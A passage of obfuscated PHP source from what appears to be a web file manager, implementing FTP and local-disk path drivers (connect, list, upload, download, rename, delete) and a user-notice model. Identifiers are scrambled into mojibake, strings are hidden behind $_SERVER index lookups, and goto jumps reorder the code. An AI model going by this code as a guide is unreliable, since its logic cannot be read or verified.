$_SERVER[å¸¿•¶£][399], !0); } public function userNoticeAdd($¬°®¡™) { $‘ßÚøß =& $_SERVER[å¸¿•¶£]; $this->initUserOption(); $¢ÑÀå‡¼ = $this->findByKey($‘ßÚøß[2297], $¬°®¡™[$‘ßÚøß[399]]); if ($¢ÑÀå‡¼) { return !0; } $ú‡¢¼’Û = array($‘ßÚøß[2297] => $¬°®¡™[$‘ßÚøß[399]], $‘ßÚøß[32] => $¬°®¡™[$‘ßÚøß[32]], $‘ßÚøß[180] => $¬°®¡™[$‘ßÚøß[180]], $‘ßÚøß[33] => isset($¬°®¡™[$‘ßÚøß[33]]) ? $¬°®¡™[$‘ßÚøß[33]] : 1, $‘ßÚøß[2298] => isset($¬°®¡™[$‘ßÚøß[2298]]) ? $¬°®¡™[$‘ßÚøß[2298]] : 0, $‘ßÚøß[756] => 0, $‘ßÚøß[196] => 0); return parent::insert($ú‡¢¼’Û); } public function userNoticeEdit($ ÛãŒÓ, $¸¤´¿Ÿ) { $this->initUserOption(); return parent::update($ ÛãŒÓ, $¸¤´¿Ÿ); } } goto B½º‹ÏŒ ¬; eÜö½™ŸèØ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($åòşŒ) { parent::__construct(); if (count($åòşŒ) > 0) { $this->_init($åòşŒ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($½÷³éÔÀ) { $Å‘ä™ï† =& $_SERVER[å¸¿•¶£]; global $config; $this->appCharset = $config[$Å‘ä™ï†[1383]]; $this->systemCharset = $config[$Å‘ä™ï†[1384]]; if (isset($½÷³éÔÀ[$Å‘ä™ï†[1385]]) && $½÷³éÔÀ[$Å‘ä™ï†[1385]]) { $this->systemCharset = $½÷³éÔÀ[$Å‘ä™ï†[1385]]; } } public function iconvApp($ù½ÒªÖ) { return $this->iconvTo($ù½ÒªÖ, $this->systemCharset, $this->appCharset); } public function iconvSystem($†¬ùªˆã) { return $this->iconvTo($†¬ùªˆã, $this->appCharset, $this->systemCharset); } public function getPathOuter($·çÊÊ”•) { $Ğ÷ÇöÑú =& $_SERVER[å¸¿•¶£]; $“†°¶‰ = $this->iconvApp($this->pathBase); $·çÊÊ”• = $this->iconvApp($·çÊÊ”•); if (substr($“†°¶‰, 0, 2) == $Ğ÷ÇöÑú[1386]) { $“†°¶‰ = BASIC_PATH . substr($“†°¶‰, 2); } if (substr($·çÊÊ”•, 0, 2) == $Ğ÷ÇöÑú[1386]) { $·çÊÊ”• = BASIC_PATH . substr($·çÊÊ”•, 2); } $“†°¶‰ = KodIO::clear($“†°¶‰); $·çÊÊ”• = KodIO::clear($·çÊÊ”•); $·çÊÊ”• = substr($·çÊÊ”•, strlen($“†°¶‰)); if (empty($this->pathDriver)) { return $·çÊÊ”•; } return $this->pathDriver . $Ğ÷ÇöÑú[8] . ltrim($·çÊÊ”•, $Ğ÷ÇöÑú[8]); } private function _init($é‚¬–Íô = array()) { $Íé­Âùº =& $_SERVER[å¸¿•¶£]; if (!function_exists($Íé­Âùº[1387])) { throw new Exception(LNG($Íé­Âùº[1388])); } $this->config = $é‚¬–Íô; $this->charsetReset($é‚¬–Íô); foreach ($é‚¬–Íô as $ˆ½—ˆ‹¨ => $¬„¦æõÈ) { if (isset($this->{$ˆ½—ˆ‹¨})) { $this->{$ˆ½—ˆ‹¨} = $¬„¦æõÈ; } } return $this->_login($é‚¬–Íô); } private function _login($…éàÊÀø) { $™¤‰¤ñ =& $_SERVER[å¸¿•¶£]; static $¶İ¬  = array(); $×½÷™Üí = md5(json_encode($…éàÊÀø)); if (isset($¶İ¬ [$×½÷™Üí])) { foreach ($¶İ¬ [$×½÷™Üí] as $ÂÒÒû÷æ => $¨Áş®Ç ) { $this->{$ÂÒÒû÷æ} = $¨Áş®Ç ; } return !0; } $ÉÄ³ğšÍ = parse_url(trim($this->server, $™¤‰¤ñ[8])); $this->host = $ÉÄ³ğšÍ[$™¤‰¤ñ[182]]; $Ò­Æ‘Äç = isset($ÉÄ³ğšÍ[$™¤‰¤ñ[181]]) && $ÉÄ³ğšÍ[$™¤‰¤ñ[181]] == $™¤‰¤ñ[1389] ? !0 : !1; $this->scheme = $Ò­Æ‘Äç ? $™¤‰¤ñ[1390] : $™¤‰¤ñ[1391]; $this->port = isset($ÉÄ³ğšÍ[$™¤‰¤ñ[183]]) ? $ÉÄ³ğšÍ[$™¤‰¤ñ[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ªåÂ¡Ã® = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ù–ŸÑèÎ = $this->pasv == $™¤‰¤ñ[88] ? !0 : !1; @ftp_pasv($this->connect, $ù–ŸÑèÎ); $¶İ¬ [$×½÷™Üí] = array($™¤‰¤ñ[1392] => $this->connect, $™¤‰¤ñ[182] => $this->host, $™¤‰¤ñ[181] => $this->scheme, $™¤‰¤ñ[183] => $this->port); return $ªåÂ¡Ã®; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($±È÷Œ¿Û, $Ó€·ªÃù = '', $Ò÷ƒğÜ = REPEAT_RENAME) { if ($this->setContent($±È÷Œ¿Û, $Ó€·ªÃù)) { return $this->getPathOuter($±È÷Œ¿Û); } return !1; } public function mkdir($ãûùÔŒ, $á§¶¶àá = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ãûùÔŒ = $this->iconvSystem($ãûùÔŒ); if ($this->_isFolder($ãûùÔŒ) || @ftp_mkdir($this->connect, $ãûùÔŒ)) { return $this->getPathOuter($ãûùÔŒ); } if (!$this->mkdir($this->pathFather($ãûùÔŒ))) { return !1; } if ($ãûùÔŒ = @ftp_mkdir($this->connect, $ãûùÔŒ)) { return $this->getPathOuter($ãûùÔŒ); } return !1; } public function copyFile($¼“Óğ•Â, $š·àü„ˆ) { if (!$this->_isconn()) { return !1; } $Ô©ª‘á = $this->pathThis($this->iconvSystem($¼“Óğ•Â)); $¨£Œó§È = $this->tempFile($Ô©ª‘á); $„ŞŠÒÆ« = $this->iconvApp($¨£Œó§È); $this->download($¼“Óğ•Â, $„ŞŠÒÆ«); $Åµ½²•ƒ = $this->upload($š·àü„ˆ, $„ŞŠÒÆ«); $this->tempFileRemve($¨£Œó§È); return $Åµ½²•ƒ; } public function moveFile($ÎïğÔä•, $ö¢òİÍÂ) { if (!$this->_isconn()) { return !1; } $ÎïğÔä• = $this->iconvSystem($ÎïğÔä•); $ö¢òİÍÂ = $this->iconvSystem($ö¢òİÍÂ); $ïÜòÕ‡ = @ftp_rename($this->connect, $ÎïğÔä•, $ö¢òİÍÂ); return $ïÜòÕ‡ ? $this->getPathOuter($ö¢òİÍÂ) : !1; } public function delFile($ıª§üÂ±) { if (!$this->_isconn()) { return !1; } $ıª§üÂ± = $this->iconvSystem($ıª§üÂ±); return @ftp_delete($this->connect, $ıª§üÂ±); } public function delFolder($Ç°”ÕßĞ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $áÆ²™»´ = $˜°˜ ˜Ä = array(); $this->fileList($Ç°”ÕßĞ, $áÆ²™»´, $˜°˜ ˜Ä, !0); $this->listItemCache = !0; foreach ($˜°˜ ˜Ä as $„òùÆ–†) { $ƒéÇëÃó = $this->iconvSystem($„òùÆ–†[$_SERVER[å¸¿•¶£][32]]); $¦¥ƒ•ì™ = @ftp_delete($this->connect, $ƒéÇëÃó); if (!$¦¥ƒ•ì™) { return !1; } } foreach ($áÆ²™»´ as $ƒéÇëÃó) { $ƒéÇëÃó = $this->iconvSystem($ƒéÇëÃó); $¦¥ƒ•ì™ = @ftp_rmdir($this->connect, $ƒéÇëÃó); if (!$¦¥ƒ•ì™) { return !1; } } $Ç°”ÕßĞ = $this->iconvSystem($Ç°”ÕßĞ); return @ftp_rmdir($this->connect, $Ç°”ÕßĞ); } public function rename($ú’Òá®, $Şùƒ¿) { $ƒª¨¤¿ =& $_SERVER[å¸¿•¶£]; if (!$this->_isconn()) { return !1; } $‡‡ÀÜÔ = $this->fileNameAuto($this->pathFather($ú’Òá®), $Şùƒ¿); $‡‡ÀÜÔ = $this->iconvSystem($‡‡ÀÜÔ); $ú’Òá® = $this->iconvSystem($ú’Òá®); $Àôª†£‘ = $this->pathFather($ú’Òá®); $ñÁÉ€˜Ï = rtrim($Àôª†£‘, $ƒª¨¤¿[8]) . $ƒª¨¤¿[8] . $‡‡ÀÜÔ; $ğš„Ãé = @ftp_rename($this->connect, $ú’Òá®, $ñÁÉ€˜Ï); $ñÁÉ€˜Ï = $this->iconvApp($ñÁÉ€˜Ï); return $ğš„Ãé ? $this->getPathOuter($ñÁÉ€˜Ï) : !1; } private function folderInfo($Ù²ôÉ¯É, $’ÒğÕØ = false) { $ØúÌßª¯ =& $_SERVER[å¸¿•¶£]; $ßĞ¬øà¢ = array($ØúÌßª¯[32] => $this->pathThis($Ù²ôÉ¯É), $ØúÌßª¯[84] => $this->getPathOuter($ØúÌßª¯[8] . $Ù²ôÉ¯É), $ØúÌßª¯[33] => $ØúÌßª¯[75]); if ($’ÒğÕØ) { return $ßĞ¬øà¢; } $ßĞ¬øà¢[$ØúÌßª¯[201]] = $ßĞ¬øà¢[$ØúÌßª¯[85]] = 0; $ßĞ¬øà¢[$ØúÌßª¯[202]] = $ßĞ¬øà¢[$ØúÌßª¯[203]] = !0; return $ßĞ¬øà¢; } private function fileInfo($Ø¢ª¸ÜË, $ßı‚ º‰ = false, $Î¸Ê¸’ğ = array()) { $³Ìâ´Ö´ =& $_SERVER[å¸¿•¶£]; $¿‚Á„¢Ã = array($³Ìâ´Ö´[32] => $this->pathThis($Ø¢ª¸ÜË), $³Ìâ´Ö´[84] => $this->getPathOuter($³Ìâ´Ö´[8] . $Ø¢ª¸ÜË), $³Ìâ´Ö´[33] => $³Ìâ´Ö´[200], $³Ìâ´Ö´[76] => isset($Î¸Ê¸’ğ[$³Ìâ´Ö´[76]]) ? $Î¸Ê¸’ğ[$³Ìâ´Ö´[76]] : 0, $³Ìâ´Ö´[174] => $this->ext($Ø¢ª¸ÜË)); if ($ßı‚ º‰) { return $¿‚Á„¢Ã; } $¿‚Á„¢Ã[$³Ìâ´Ö´[201]] = $¿‚Á„¢Ã[$³Ìâ´Ö´[85]] = 0; $¿‚Á„¢Ã[$³Ìâ´Ö´[202]] = $¿‚Á„¢Ã[$³Ìâ´Ö´[203]] = !0; $–İŞëÔñ = $this->iconvSystem($Ø¢ª¸ÜË); $¿‚Á„¢Ã[$³Ìâ´Ö´[85]] = @ftp_mdtm($this->connect, $–İŞëÔñ); if (empty($Î¸Ê¸’ğ)) { $Î¸Ê¸’ğ = $this->objectMeta($Ø¢ª¸ÜË); if (!$Î¸Ê¸’ğ) { return $¿‚Á„¢Ã; } } $¿‚Á„¢Ã[$³Ìâ´Ö´[76]] = $Î¸Ê¸’ğ[$³Ìâ´Ö´[76]]; return $¿‚Á„¢Ã; } public function size($—ÙÊ¶¹á) { $–¯Éª = $this->objectMeta($—ÙÊ¶¹á); return $–¯Éª ? $–¯Éª[$_SERVER[å¸¿•¶£][76]] : 0; } public function info($ûú£ó–ï) { if ($this->isFile($ûú£ó–ï)) { return $this->fileInfo($ûú£ó–ï, 0); } else { if ($this->isFolder($ûú£ó–ï)) { return $this->folderInfo($ûú£ó–ï); } } return !1; } private function fileList($½ÛÂ¿³×, &$É°¦«ã, &$Ç‘ü…øà, $ €Å×¥Ò = false) { $¡çÎõâú =& $_SERVER[å¸¿•¶£]; $½ÛÂ¿³× = $this->iconvSystem($½ÛÂ¿³×); if (!$this->isFolder($½ÛÂ¿³×)) { return !1; } @ftp_chdir($this->connect, $¡çÎõâú[8]); $½ÛÂ¿³× = rtrim($½ÛÂ¿³×, $¡çÎõâú[8]) . $¡çÎõâú[8]; check_abort(); $çÏôêÂ = @ftp_rawlist($this->connect, $½ÛÂ¿³×); if (!$çÏôêÂ) { $çÏôêÂ = array(); } $ŒÀ·Òéª = array($¡çÎõâú[10] => 1, $¡çÎõâú[1393] => 1); foreach ($çÏôêÂ as $ËÎîæ´) { $á÷¤¤ÌĞ = $this->_listItem($ËÎîæ´); if ($á÷¤¤ÌĞ[0] == $¡çÎõâú[765]) { continue; } $·Ò¸¨©¼ = $á÷¤¤ÌĞ[8]; if (empty($·Ò¸¨©¼) && $·Ò¸¨©¼ !== $¡çÎõâú[198] || isset($ŒÀ·Òéª[$·Ò¸¨©¼])) { continue; } $·Ò¸¨©¼ = $this->iconvApp($½ÛÂ¿³× . ltrim($·Ò¸¨©¼, $¡çÎõâú[8])); $‰†‹˜Êğ = array($¡çÎõâú[32] => $·Ò¸¨©¼, $¡çÎõâú[33] => $¡çÎõâú[200], $¡çÎõâú[76] => $á÷¤¤ÌĞ[4]); if (substr($ËÎîæ´, 0, 1) == $¡çÎõâú[1394]) { $‰†‹˜Êğ[$¡çÎõâú[33]] = $¡çÎõâú[75]; $‰†‹˜Êğ[$¡çÎõâú[76]] = 0; } $‰£áè–„ = $‰†‹˜Êğ[$¡çÎõâú[33]] == $¡çÎõâú[75] ? !0 : !1; $this->cacheMethodInfoSet($·Ò¸¨©¼, $‰£áè–„, $‰†‹˜Êğ); if ($‰£áè–„) { $É°¦«ã[] = $·Ò¸¨©¼; if ($ €Å×¥Ò) { $this->fileList($·Ò¸¨©¼, $É°¦«ã, $Ç‘ü…øà, $ €Å×¥Ò); } continue; } $Ç‘ü…øà[] = $‰†‹˜Êğ; } $this->cacheMethodInfoSet($½ÛÂ¿³×, !0); } private function _listItem($ƒú©ÜÈğ) { if (empty($ƒú©ÜÈğ)) { return array(); } $½Ê†„Î„ = preg_split($_SERVER[å¸¿•¶£][1395], $ƒú©ÜÈğ); if (count($½Ê†„Î„) <= 9) { return $½Ê†„Î„; } $½Ê†„Î„[8] = trim(substr($ƒú©ÜÈğ, strpos($ƒú©ÜÈğ, $½Ê†„Î„[7]) + strlen($½Ê†„Î„[7]))); return array_splice($½Ê†„Î„, 0, 9); } public function listPath($ÏËîûÅà, $ê•Á³´€ = false) { $‘Œ²œĞ„ =& $_SERVER[å¸¿•¶£]; if (!$this->_isconn()) { return !1; } $…Õ¾üä« = $õ±ôÖ = array(); $this->fileList($ÏËîûÅà, $…Õ¾üä«, $õ±ôÖ); foreach ($…Õ¾üä« as $ò•Í÷ä => $Üöİ§‚À) { $…Õ¾üä«[$ò•Í÷ä] = $this->folderInfo($Üöİ§‚À, $ê•Á³´€); } foreach ($õ±ôÖ as $ò•Í÷ä => $Üöİ§‚À) { $õ±ôÖ[$ò•Í÷ä] = $this->fileInfo($Üöİ§‚À[$‘Œ²œĞ„[32]], $ê•Á³´€, $Üöİ§‚À); } return array($‘Œ²œĞ„[82] => $…Õ¾üä«, $‘Œ²œĞ„[83] => $õ±ôÖ); } public function has($Ã÷°Ä—Ã, $¬èˆá’ = false, $ÚÅ•¥ü° = true) { $‰¿Îûõó =& $_SERVER[å¸¿•¶£]; $éâÇàèé = $Ôø«Õ½‹ = array(); $©¼Ô‰Ø = $¬èˆá’ ? !0 : !1; $this->fileList($Ã÷°Ä—Ã, $éâÇàèé, $Ôø«Õ½‹, $©¼Ô‰Ø); if ($¬èˆá’) { return array($‰¿Îûõó[207] => count($Ôø«Õ½‹), $‰¿Îûõó[208] => count($éâÇàèé)); } if ($ÚÅ•¥ü°) { if (count($Ôø«Õ½‹)) { return !0; } } else { if (count($éâÇàèé)) { return !0; } } return !1; } public function listAll($£©Ğ˜Š ) { $ä¶·‡–¯ =& $_SERVER[å¸¿•¶£]; if (!$this->_isconn()) { return !1; } $áƒó¡â = $ø‡á™† = array(); $this->fileList($£©Ğ˜Š , $áƒó¡â, $ø‡á™†, !0); $¡…úÑã’ = array_to_keyvalue($ø‡á™†, $ä¶·‡–¯[32]); foreach ($áƒó¡â as $ö¿Û®ÙĞ) { if (is_string($ö¿Û®ÙĞ)) { $¡…úÑã’[$ö¿Û®ÙĞ] = array($ä¶·‡–¯[76] => 0); } } return $this->listAllFiles($£©Ğ˜Š , $¡…úÑã’); } public function getContent($û±Òä”ë) { if (!$this->_isconn()) { return !1; } $û±Òä”ë = $this->iconvSystem($û±Òä”ë); return $this->fileSubstr($û±Òä”ë); } public function setContent($í’û¬Õ, $ÁİÕ©İö = '') { if (!$this->_isconn()) { return !1; } $Ÿ„Öƒ¥ = $this->pathThis($this->iconvSystem($í’û¬Õ)); $Ò¨âÒªÉ = $this->tempFile($Ÿ„Öƒ¥); file_put_contents($Ò¨âÒªÉ, $ÁİÕ©İö); $Şëú§š¯ = $this->upload($í’û¬Õ, $this->iconvApp($Ò¨âÒªÉ)); $this->tempFileRemve($Ò¨âÒªÉ); return $Şëú§š¯; } public function fileSubstr($İ›®æ²ï, $éšÏ¥‚• = 0, $ËöØÎ½® = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($İ›®æ²ï, $éšÏ¥‚•, $ËöØÎ½®); } private function ftpRequest($ßìı™©ñ, $úù‚Î¤ = 0, $ú‚¦ø©ï = false) { $ßìı™©ñ = $this->iconvSystem($ßìı™©ñ); $ê­ÑÌ—Ê = $this->scheme . $this->host . $_SERVER[å¸¿•¶£][4] . $this->port; $ÚìÎÈ¾ù = curl_init(); curl_setopt($ÚìÎÈ¾ù, CURLOPT_URL, $ê­ÑÌ—Ê . $this->pathEncode($ßìı™©ñ)); curl_setopt($ÚìÎÈ¾ù, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ú‚¦ø©ï) { $—ç±Á = $úù‚Î¤ + $ú‚¦ø©ï - 1; curl_setopt($ÚìÎÈ¾ù, CURLOPT_RANGE, "{$úù‚Î¤}\x2d{$—ç±Á}"); } curl_setopt($ÚìÎÈ¾ù, CURLOPT_RETURNTRANSFER, 1); $ùİŒğ½› = curl_exec($ÚìÎÈ¾ù); curl_close($ÚìÎÈ¾ù); return $ùİŒğ½›; } public function upload($à·û°é¸, $ç¹ò°±ı, $ÅÊ„ôÖº = false, $Ë‰”† Ğ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($à·û°é¸))) { return !1; } $à·û°é¸ = $this->iconvSystem($à·û°é¸); $ç¹ò°±ı = $this->iconvSystem($ç¹ò°±ı); $÷Òî¨™ = ftp_nb_put($this->connect, $à·û°é¸, $ç¹ò°±ı, FTP_BINARY); while ($÷Òî¨™ == FTP_MOREDATA) { $÷Òî¨™ = ftp_nb_continue($this->connect); } if ($÷Òî¨™ != FTP_FINISHED) { return !1; } return $this->getPathOuter($à·û°é¸); } public function download($Ø™ÈÌì„, $ß¢¬Êô„ = '') { if (!$this->_isconn()) { return !1; } $È¾½ş¦É = $this->pathFather($ß¢¬Êô„); if (!IO::mkdir($È¾½ş¦É)) { return !1; } $Ø™ÈÌì„ = $this->iconvSystem($Ø™ÈÌì„); $ß¢¬Êô„ = $this->iconvSystem($ß¢¬Êô„); $¿ü¹¹¦¨ = ftp_nb_get($this->connect, $ß¢¬Êô„, $Ø™ÈÌì„, FTP_BINARY); while ($¿ü¹¹¦¨ == FTP_MOREDATA) { $¿ü¹¹¦¨ = ftp_nb_continue($this->connect); } if ($¿ü¹¹¦¨ != FTP_FINISHED) { return !1; } return $this->iconvApp($ß¢¬Êô„); } public function exist($±¼¼‚¸) { return $this->isFile($±¼¼‚¸) || $this->isFolder($±¼¼‚¸); } public function isFile($şıùéË) { return !$this->isFolder($şıùéË) && $this->objectMeta($şıùéË); } public function isFolder($½½²ñÏÙ) { return $this->cacheMethod($_SERVER[å¸¿•¶£][165], $½½²ñÏÙ); } protected function objectMeta($ä‚Æøåæ) { return $this->cacheMethod($_SERVER[å¸¿•¶£][167], $ä‚Æøåæ); } protected function _objectMeta($Ûä¨¤î) { $ÏÎË’„ =& $_SERVER[å¸¿•¶£]; if ($Ûä¨¤î == $ÏÎË’„[12] || $Ûä¨¤î == $ÏÎË’„[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ûä¨¤î = $this->iconvSystem($Ûä¨¤î); $óÇ øÍî = array($ÏÎË’„[32] => $this->iconvApp($Ûä¨¤î), $ÏÎË’„[33] => $ÏÎË’„[200], $ÏÎË’„[76] => 0); @ftp_chdir($this->connect, $ÏÎË’„[8]); $ÔŞÒÅ› = @ftp_size($this->connect, $Ûä¨¤î); if ($ÔŞÒÅ› != -1) { $óÇ øÍî[$ÏÎË’„[76]] = $ÔŞÒÅ›; } else { $Ûµ¶Òª = @ftp_chdir($this->connect, $Ûä¨¤î); if (!$Ûµ¶Òª) { return !1; } $óÇ øÍî[$ÏÎË’„[33]] = $ÏÎË’„[75]; } return $óÇ øÍî; } protected function _isFolder($ôåÚˆœÓ) { $ƒ²Ö«­ï =& $_SERVER[å¸¿•¶£]; if ($ôåÚˆœÓ == $ƒ²Ö«­ï[12] || $ôåÚˆœÓ == $ƒ²Ö«­ï[8]) { return !0; } $ ß«·ëÆ = $this->_objectMeta($ôåÚˆœÓ); return isset($ ß«·ëÆ[$ƒ²Ö«­ï[33]]) && $ ß«·ëÆ[$ƒ²Ö«­ï[33]] == $ƒ²Ö«­ï[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ï°‡çº) { if (substr($ï°‡çº, 0, 2) == $_SERVER[å¸¿•¶£][1386]) { $ï°‡çº = BASIC_PATH . substr($ï°‡çº, 2); } return $ï°‡çº; } public function iconvApp($Ôö˜Îï…) { $ÁÁŠñ‚ì =& $_SERVER[å¸¿•¶£]; global $config; return $this->iconvTo($Ôö˜Îï…, $config[$ÁÁŠñ‚ì[1384]], $config[$ÁÁŠñ‚ì[1383]]); } public function iconvSystem($°û®•ƒ) { $“¾ÊÑà =& $_SERVER[å¸¿•¶£]; global $config; return $this->iconvTo($°û®•ƒ, $config[$“¾ÊÑà[1383]], $config[$“¾ÊÑà[1384]]); } public function getPathOuter($÷¨áÉ¼) { $¶‚¾ÄÔê =& $_SERVER[å¸¿•¶£]; $ÑùÏõŞÇ = $this->iconvApp($this->pathBase); $÷¨áÉ¼ = $this->iconvApp($÷¨áÉ¼); if (substr($ÑùÏõŞÇ, 0, 2) == $¶‚¾ÄÔê[1386]) { $ÑùÏõŞÇ = BASIC_PATH . substr($ÑùÏõŞÇ, 2); } if (substr($÷¨áÉ¼, 0, 2) == $¶‚¾ÄÔê[1386]) { $÷¨áÉ¼ = BASIC_PATH . substr($÷¨áÉ¼, 2); } $ÑùÏõŞÇ = KodIO::clear($ÑùÏõŞÇ); $÷¨áÉ¼ = KodIO::clear($÷¨áÉ¼); $÷¨áÉ¼ = substr($÷¨áÉ¼, strlen($ÑùÏõŞÇ)); if (empty($this->pathDriver)) { return $÷¨áÉ¼; } return $this->pathDriver . $¶‚¾ÄÔê[8] . ltrim($÷¨áÉ¼, $¶‚¾ÄÔê[8]); } public function mkfile($íÇÇá¸‚, $‚÷»Ã¯ì = '', $ØÚ—¬Íæ = REPEAT_RENAME) { $íÇÇá¸‚ = $this->iconvSystem($íÇÇá¸‚); @touch($íÇÇá¸‚); if ($‚÷»Ã¯ì) { file_put_contents($íÇÇá¸‚, $‚÷»Ã¯ì); } @chmod($íÇÇá¸‚, $this->pathAuth); return is_file($íÇÇá¸‚) ? $this->getPathOuter($íÇÇá¸‚) : !1; } public function mkdir($òÙÒ‰°½, $êÖ¼’Íˆ = REPEAT_SKIP) { $òÙÒ‰°½ = $this->iconvSystem($òÙÒ‰°½); if (is_dir($òÙÒ‰°½)) { return $this->getPathOuter($òÙÒ‰°½); } @mkdir($òÙÒ‰°½, $this->pathAuth, !0); @chmod($òÙÒ‰°½, $this->pathAuth); return is_dir($òÙÒ‰°½) ? $this->getPathOuter($òÙÒ‰°½) : !1; } public function copyFile($·‚»À…š, $ ù¶û—ˆ) { $this->mkdir($this->pathFather($ ù¶û—ˆ)); $·‚»À…š = $this->iconvSystem($·‚»À…š); $ ù¶û—ˆ = $this->iconvSystem($ ù¶û—ˆ); $º¦Á±‡ = copy_64($·‚»À…š, $ ù¶û—ˆ); @chmod($ ù¶û—ˆ, $this->pathAuth); return $º¦Á±‡ ? $this->getPathOuter($ ù¶û—ˆ) : !1; } public function moveFile($ŠÈ¿îË, $˜“»¶Ÿ«) { $this->mkdir($this->pathFather($˜“»¶Ÿ«)); $ŠÈ¿îË = $this->iconvSystem($ŠÈ¿îË); $˜“»¶Ÿ« = $this->iconvSystem($˜“»¶Ÿ«); $ëÑ¢áæÑ = intval(@rename($ŠÈ¿îË, $˜“»¶Ÿ«)); if (!$ëÑ¢áæÑ) { if ($ëÑ¢áæÑ = intval(@copy_64($ŠÈ¿îË, $˜“»¶Ÿ«))) { @unlink($ŠÈ¿îË); } } @chmod($˜“»¶Ÿ«, $this->pathAuth); return $ëÑ¢áæÑ ? $this->getPathOuter($˜“»¶Ÿ«) : !1; } public function movePath($’Ôù‚¯, $¤¶™ñ…Ô, $ôñ°òÒ = false) { $€Äİ¥º =& $_SERVER[å¸¿•¶£]; $’Ôù‚¯ = $this->iconvSystem($’Ôù‚¯); $¤¶™ñ…Ô = $this->iconvSystem($¤¶™ñ…Ô); $®õ¥àÇÃ = rtrim($¤¶™ñ…Ô, $€Äİ¥º[8]) . $€Äİ¥º[8] . ($ôñ°òÒ ? $ôñ°òÒ : get_path_this($’Ôù‚¯)); if (file_exists($®õ¥àÇÃ)) { return !1; } $ã˜÷ë = intval(@rename($’Ôù‚¯, $®õ¥àÇÃ)); $ã˜÷ë = file_exists($®õ¥àÇÃ); return $ã˜÷ë ? $this->getPathOuter($®õ¥àÇÃ) : !1; } public function delFile($›Ä¶ää) { $›Ä¶ää = $this->iconvSystem($›Ä¶ää); if (!@unlink($›Ä¶ää)) { @chmod($›Ä¶ää, $this->pathAuth); if (!@unlink($›Ä¶ää)) { return !1; } } else { return !0; } } public function delFolder($‘Õù‘ÉÅ) { $àÍŒ¥ò =& $_SERVER[å¸¿•¶£]; $‘Õù‘ÉÅ = $this->iconvSystem($‘Õù‘ÉÅ); if (!is_dir($‘Õù‘ÉÅ)) { return !0; } if (!($İÄ£‰ç = opendir($‘Õù‘ÉÅ))) { return !1; } while (($â¼øıö = readdir($İÄ£‰ç)) !== !1) { if ($â¼øıö == $àÍŒ¥ò[10] || $â¼øıö == $àÍŒ¥ò[1393]) { continue; } $“ßĞÚÚ˜ = $‘Õù‘ÉÅ . $àÍŒ¥ò[8] . $â¼øıö; if (is_file($“ßĞÚÚ˜) || is_link($“ßĞÚÚ˜)) { if (!unlink($“ßĞÚÚ˜)) { chmod($“ßĞÚÚ˜, $this->pathAuth); if (!unlink($“ßĞÚÚ˜)) { return !1; } } } else { if (is_dir($“ßĞÚÚ˜)) { chmod($“ßĞÚÚ˜, $this->pathAuth); $“ßĞÚÚ˜ = $this->iconvApp($“ßĞÚÚ˜); if (!$this->delFolder($“ßĞÚÚ˜)) { return !1; } } } } closedir($İÄ£‰ç); return rmdir($‘Õù‘ÉÅ); } public function rename($©ˆóÎ†, $éÍ³äñ) { $°†ßüŸ¯ =& $_SERVER[å¸¿•¶£]; $üÉğÍ€™ = $this->fileNameAuto($this->pathFather($©ˆóÎ†), $éÍ³äñ); $üÉğÍ€™ = $this->iconvSystem($üÉğÍ€™); $©ˆóÎ† = $this->iconvSystem($©ˆóÎ†); $¡ŒµäÄÍ = $this->pathFather($©ˆóÎ†); $³…×Ù‰¾ = rtrim($¡ŒµäÄÍ, $°†ßüŸ¯[8]) . $°†ßüŸ¯[8] . $üÉğÍ€™; $öŒÌİç­ = @rename($©ˆóÎ†, $³…×Ù‰¾); $³…×Ù‰¾ = $this->iconvApp($³…×Ù‰¾); return $öŒÌİç­ ? $this->getPathOuter($³…×Ù‰¾) : !1; } public function size($ Òí¢òÛ) { $ Òí¢òÛ = $this->iconvSystem($ Òí¢òÛ); return filesize_64($ Òí¢òÛ); } public function info($Ò¢¢ÉÏ·) { $Ò¢¢ÉÏ· = $this->iconvSystem($Ò¢¢ÉÏ·); if ($this->isFolder($Ò¢¢ÉÏ·)) { return $this->folderInfo($Ò¢¢ÉÏ·); } else { if ($this->isFile($Ò¢¢ÉÏ·)) { return $this->fileInfo($Ò¢¢ÉÏ·); } } return !1; } protected function infoChildren($•ì¹¸‹¥, &$åË˜¸Ô€, $ßŠ“¢Æ¸ = true) { $æÕÜ·ñ› =& $_SERVER[å¸¿•¶£]; check_abort_echo(); $•ì¹¸‹¥ = rtrim($•ì¹¸‹¥, $æÕÜ·ñ›[8]) . $æÕÜ·ñ›[8]; if ($ßŠ“¢Æ¸) { $•ì¹¸‹¥ = $this->iconvSystem($•ì¹¸‹¥); } if (!($Ğ×ÜÑ–¥ = @opendir($•ì¹¸‹¥))) { return; } while (($’—Ğœ÷ = readdir($Ğ×ÜÑ–¥)) !== !1) { if ($’—Ğœ÷ == $æÕÜ·ñ›[10] || $’—Ğœ÷ == $æÕÜ·ñ›[1393]) { continue; } $À²ò·Á = $•ì¹¸‹¥ . $’—Ğœ÷; if (is_file($À²ò·Á) || is_link($À²ò·Á)) { $åË˜¸Ô€[$æÕÜ·ñ›[77]]++; $åË˜¸Ô€[$æÕÜ·ñ›[76]] += filesize_64($À²ò·Á); } else { if (is_dir($À²ò·Á)) { $åË˜¸Ô€[$æÕÜ·ñ›[78]]++; $this->infoChildren($À²ò·Á, $åË˜¸Ô€, !1); } } } closedir($Ğ×ÜÑ–¥); } private function folderInfo($ããÉù€é, $Ì™í‰ş€ = false) { $‚şíÏ®· =& 